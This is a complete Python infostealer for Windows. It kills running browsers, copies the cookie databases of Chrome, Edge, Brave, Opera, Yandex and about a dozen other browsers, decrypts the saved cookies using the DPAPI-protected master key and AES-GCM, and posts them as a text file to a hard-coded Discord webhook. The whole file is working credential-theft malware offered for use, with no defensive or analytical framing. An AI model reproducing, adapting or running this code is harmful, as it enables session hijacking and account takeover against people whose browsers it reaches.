#!/usr/bin/env python
import sys
import subprocess
import importlib

def install_and_import(package, module_name=None):
    """
    Attempts to import a module. If not installed, installs the package via pip and imports it.
    :param package: The pip package name to install.
    :param module_name: The module name to import (if different from package). Defaults to package.
    :return: The imported module.
    """
    if module_name is None:
        module_name = package
    try:
        return importlib.import_module(module_name)
    except ImportError:
        print(f"[INFO] Package '{package}' not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        return importlib.import_module(module_name)

# Automatically ensure third‑party dependencies are installed
psutil = install_and_import("psutil")
# For pycryptodome: note that the module is named "Crypto"
crypto = install_and_import("pycryptodome", "Crypto")
from Crypto.Cipher import AES

# For pywin32: pip package "pywin32" provides the module "win32crypt"
win32crypt = install_and_import("pywin32", "win32crypt")
from win32crypt import CryptUnprotectData

requests = install_and_import("requests")

# Standard library imports
import base64
import json
import time
import os
import random
import sqlite3
from shutil import copy2
from getpass import getuser
from io import StringIO

# Your Discord webhook URL (change as needed)
WEBHOOK_URL = "https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5"

def create_temp(_dir: str or os.PathLike = None):
    """
    Creates a temporary file in the specified directory (default: ~/tmp) and returns its path.
    """
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
                        for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = [
            "chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe",
            "centbrowser.exe", "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe",
            "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"
        ]
        self.browsers_found = []
        self.browsers = {
            'kometa': os.path.join(self.appdata, 'Kometa', 'User Data'),
            'orbitum': os.path.join(self.appdata, 'Orbitum', 'User Data'),
            'cent-browser': os.path.join(self.appdata, 'CentBrowser', 'User Data'),
            '7star': os.path.join(self.appdata, '7Star', '7Star', 'User Data'),
            'sputnik': os.path.join(self.appdata, 'Sputnik', 'Sputnik', 'User Data'),
            'vivaldi': os.path.join(self.appdata, 'Vivaldi', 'User Data'),
            'google-chrome-sxs': os.path.join(self.appdata, 'Google', 'Chrome SxS', 'User Data'),
            'google-chrome': os.path.join(self.appdata, 'Google', 'Chrome', 'User Data'),
            'epic-privacy-browser': os.path.join(self.appdata, 'Epic Privacy Browser', 'User Data'),
            'microsoft-edge': os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data'),
            'uran': os.path.join(self.appdata, 'uCozMedia', 'Uran', 'User Data'),
            'yandex': os.path.join(self.appdata, 'Yandex', 'YandexBrowser', 'User Data'),
            'brave': os.path.join(self.appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'iridium': os.path.join(self.appdata, 'Iridium', 'User Data'),
            'opera': os.path.join(self.roaming, 'Opera Software', 'Opera Stable'),
            'opera-gx': os.path.join(self.roaming, 'Opera Software', 'Opera GX Stable'),
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        # Close any running browser processes to avoid locked files.
        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)
        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass
        time.sleep(3)

    def grab_cookies(self):
        """
        Iterates through browsers and profiles to retrieve cookies and then sends them to a webhook.
        """
        all_cookies = StringIO()  # In-memory file to store all cookies

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(os.path.join(path, 'Local State'))
            self.funcs = [self.cookies]

            for profile in self.profiles:
                for func in self.funcs:
                    self.process_browser(name, path, profile, func, all_cookies)  # Pass the file object

        all_cookies.seek(0)  # Reset file pointer to the beginning
        self.send_to_webhook(all_cookies)  # Send the collected cookies

    def process_browser(self, name, path, profile, func, all_cookies):
        """
        Processes a specific browser and profile using the provided function.
        """
        try:
            func(name, path, profile, all_cookies)  # Pass the file object
        except Exception as e:
            print(f"Error occurred while processing browser '{name}' with profile '{profile}': {str(e)}")

    def get_master_key(self, path: str) -> bytes:
        """
        Retrieves and decrypts the master key from the browser's Local State file.
        """
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Error occurred while retrieving master key: {str(e)}")
            return None  # Return None if master key retrieval fails

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        """
        Decrypts an encrypted password (cookie) using the master key.
        """
        if master_key is None:  # Handle cases where master_key is None
            return "Master key not available"
        iv = buff[3:15]
        payload = buff[15:]
        try:
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return f"Decryption error: {e}"

    def cookies(self, name: str, path: str, profile: str, all_cookies):
        """
        Extracts cookies from a given browser profile and writes them to the provided file object.
        """
        if name in ['opera', 'opera-gx']:
            path = os.path.join(path, 'Network', 'Cookies')
        else:
            path = os.path.join(path, profile, 'Network', 'Cookies')
        if not os.path.isfile(path):
            return

        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()

        all_cookies.write(f"\nBrowser: {name} | Profile: {profile}\n\n")
        query = "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies"
        for res in cursor.execute(query).fetchall():
            host_key, cookie_name, cookie_path, encrypted_value, expires_utc = res
            value = self.decrypt_password(encrypted_value, self.masterkey)
            if host_key and cookie_name and value != "":
                all_cookies.write(
                    f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{cookie_path}\t"
                    f"{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{cookie_name}\t{value}\n"
                )

        cursor.close()
        conn.close()
        os.remove(cookievault)

    def send_to_webhook(self, file_content):
        """
        Sends the collected cookies as a text file to the specified Discord webhook.
        """
        try:
            files = {'file': ('cookies.txt', file_content.getvalue(), 'text/plain')}
            response = requests.post(WEBHOOK_URL, files=files)

            if response.status_code not in (200, 204):
                print(f"Error sending webhook: {response.status_code} - {response.text}")
                return

            print("Cookies sent to webhook as a file successfully!")
        except Exception as e:
            print(f"Error sending webhook: {e}")

if __name__ == "__main__":
    browser_instance = Browsers()
    browser_instance.grab_cookies()